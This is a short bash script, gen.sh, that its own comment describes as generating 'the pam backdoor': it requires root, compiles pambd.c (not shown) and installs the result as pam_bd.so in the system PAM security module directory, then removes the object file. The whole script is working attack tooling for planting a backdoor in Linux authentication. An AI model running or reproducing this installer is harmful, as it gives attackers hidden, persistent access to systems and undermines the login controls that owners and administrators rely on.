#!/bin/bash
# gen.sh - generate the pam backdoor.

BIN_GCC='/usr/bin/gcc'
BIN_LD='/usr/bin/ld'
BIN_RM='/bin/rm'

CFLAGS='-fPIC'
LDFLAGS='-x --shared'

if [ "$(id -u)" != '0' ]; then
    echo 'This script must be run as root!' 1>&2
    exit 1
fi

${BIN_GCC} ${CFLAGS} -c pambd.c
${BIN_LD} ${LDFLAGS} -o /lib/x86_64-linux-gnu/security/pam_bd.so pambd.o
${BIN_RM} pambd.o
